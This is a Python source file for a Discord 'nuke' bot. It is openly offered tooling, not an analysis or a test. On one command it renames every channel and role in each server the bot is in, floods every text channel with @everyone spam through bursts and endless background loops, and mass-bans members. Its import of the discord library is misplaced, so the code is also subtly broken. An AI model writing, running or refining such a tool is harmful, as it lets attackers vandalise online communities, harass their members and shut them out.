import asyncio
import os
from discord.ext import commands
import dotenv
from datetime import datetime

dotenv.load_dotenv()

# ===== BOT SETUP =====
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# ===== CONSTANTS =====
NUKE_NAME = "NUKE BY HARYAS"
NUKE_MESSAGE = """ @everyone nuke by Haryas @everyone nuke by Haryas"""
PROTECTED_ID = 1291403526311772298

BURST_COUNT = 100
BURST_DELAY = 0.5  # seconds
BAN_CONCURRENCY = 10
BAN_CHUNK_DELAY = 0.3  # seconds
INTERVAL_SECONDS = 5

# Background intervals storage
background_intervals = []

# ===== HELPERS =====
async def sleep(seconds):
    await asyncio.sleep(seconds)

async def parallel_chunked(items, fn, concurrency=10, chunk_delay=0):
    """Run fn on items in parallel chunks"""
    for i in range(0, len(items), concurrency):
        chunk = items[i:i + concurrency]
        tasks = [fn(item) for item in chunk]
        await asyncio.gather(*tasks, return_exceptions=True)
        if chunk_delay > 0 and i + concurrency < len(items):
            await sleep(chunk_delay)

# ===== PHASE 1 — RENAME ALL CHANNELS =====
async def rename_all_channels(guild):
    print(f"\n[{guild.name}] ── Phase 1: Rename All ──")
    
    channels = [ch async for ch in guild.fetch_channels() if ch]
    
    tasks = []
    for channel in channels:
        async def rename_task(ch):
            try:
                await ch.edit(name=NUKE_NAME)
                print(f"  ✅ Renamed: #{ch.name}")
            except Exception as e:
                print(f"  ❌ Rename failed [{ch.name}]: {e}")
        
        tasks.append(rename_task(channel))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"[{guild.name}] ── Rename phase done ──")

# ===== PHASE 2 — RENAME ALL ROLES =====
async def rename_all_roles(guild):
    print(f"\n[{guild.name}] ── Phase 2: Rename All Roles ──")
    
    roles = [role async for role in guild.fetch_roles() 
             if not role.managed and role.id != guild.id]
    
    tasks = []
    for role in roles:
        async def rename_task(role):
            try:
                await role.edit(name=NUKE_NAME)
                print(f"  ✅ Role renamed: @{role.name}")
            except Exception as e:
                print(f"  ❌ Role rename failed [@{role.name}]: {e}")
        
        tasks.append(rename_task(role))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"[{guild.name}] ── Role rename phase done ──")

# ===== PHASE 3 — BURST MESSAGES =====
async def burst_channel(channel):
    """Send BURST_COUNT messages to single channel"""
    for i in range(BURST_COUNT):
        try:
            await channel.send(NUKE_MESSAGE)
            await sleep(BURST_DELAY)
        except Exception as e:
            print(f"  ❌ Burst stopped [#{channel.name}] at msg {i + 1}: {e}")
            return

def start_silent_interval(channel):
    """Start background spam interval for channel"""
    async def interval_task():
        while True:
            try:
                await channel.send(NUKE_MESSAGE)
                await sleep(INTERVAL_SECONDS)
            except:
                break  # Channel gone or perms revoked
    
    task = asyncio.create_task(interval_task())
    background_intervals.append(task)

async def burst_all(guild):
    print(f"\n[{guild.name}] ── Phase 3: Parallel Burst ──")
    
    text_channels = []
    async for channel in guild.fetch_channels():
        if channel and isinstance(channel, (discord.TextChannel, discord.Thread)):
            text_channels.append(channel)
    
    print(f"  📡 Bursting {len(text_channels)} text channels in parallel...")
    
    # Burst all channels simultaneously
    tasks = [burst_channel(ch) for ch in text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Start silent background intervals
    for ch in text_channels:
        start_silent_interval(ch)
    
    print(f"[{guild.name}] ── Burst done. {len(text_channels)} silent intervals running ──")

# ===== PHASE 4 — MASS BAN =====
def should_skip_member(member):
    if member.id == bot.user.id:
        return "self"
    if member.id == PROTECTED_ID:
        return "protected"
    if member.id == member.guild.owner_id:
        return "owner"
    if member.guild_permissions.administrator:
        return "admin"
    
    # Role hierarchy check
    if bot.get_guild(member.guild.id).get_member(bot.user.id):
        bot_member = bot.get_guild(member.guild.id).get_member(bot.user.id)
        if member.top_role >= bot_member.top_role:
            return "role-hierarchy"
    
    return None

async def ban_all_members(guild):
    print(f"\n[{guild.name}] ── Phase 4: Mass Ban ──")
    
    try:
        members = [member async for member in guild.fetch_members(limit=None)]
    except Exception as e:
        print(f"  ❌ Could not fetch members: {e}")
        return
    
    bot_id = bot.user.id
    to_skip = []
    to_ban = []
    
    for member in members:
        reason = should_skip_member(member)
        if reason:
            to_skip.append((member, reason))
        else:
            to_ban.append(member)
    
    for member, reason in to_skip:
        print(f"  ⏭️  Skipped ({reason}): {member}")
    
    print(f"  🔨 Banning {len(to_ban)} members, {BAN_CONCURRENCY} at a time...")
    
    async def ban_member(member):
        try:
            await member.ban(reason="Mass ban")
            print(f"  ✅ Banned: {member}")
        except Exception as e:
            print(f"  ❌ Ban failed [{member}]: {e}")
    
    await parallel_chunked(to_ban, ban_member, BAN_CONCURRENCY, BAN_CHUNK_DELAY)
    print(f"[{guild.name}] ── Ban phase done ──")

# ===== MAIN NUKE FUNCTION =====
async def nuke_guild(guild):
    bar = "─" * 44
    print(f"\n{'═' * 44}")
    print(f"💣  {guild.name}")
    print(f"{'═' * 44}")
    
    await rename_all_channels(guild)
    await rename_all_roles(guild)
    await burst_all(guild)
    await ban_all_members(guild)
    
    print(f"\n{bar}")
    print(f"✨ [{guild.name}] — All phases done. Silent intervals running.")
    print(bar)

async def nuke_all_guilds():
    guilds = [guild async for guild in bot.fetch_guilds(limit=None)]
    print(f"\n🌐 Found {len(guilds)} guild(s)")
    
    for guild in guilds:
        try:
            full_guild = bot.get_guild(guild.id) or await guild.fetch()
            await nuke_guild(full_guild)
        except Exception as e:
            print(f"❌ Could not process guild [{guild.id}]: {e}")

# ===== COMMANDS =====
@bot.command()
async def nuke(ctx):
    """Nuke command"""
    if not ctx.author.guild_permissions.administrator:
        return
    
    print("🔥 Nuke sequence started...\n")
    await nuke_all_guilds()
    await ctx.send("✅ All phases done. Background intervals running.")

@bot.command()
async def exit(ctx):
    """Stop all operations"""
    print("👋 Shutting down...")
    for task in background_intervals:
        task.cancel()
    await bot.close()

# ===== EVENTS =====
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    print("Commands: !nuke, !exit")

# ===== BOOT =====
if __name__ == "__main__":
    import discord
    discord.utils.setup_logging()
    
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ DISCORD_TOKEN not found in .env")
        exit(1)
    
    try:
        bot.run(token)
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
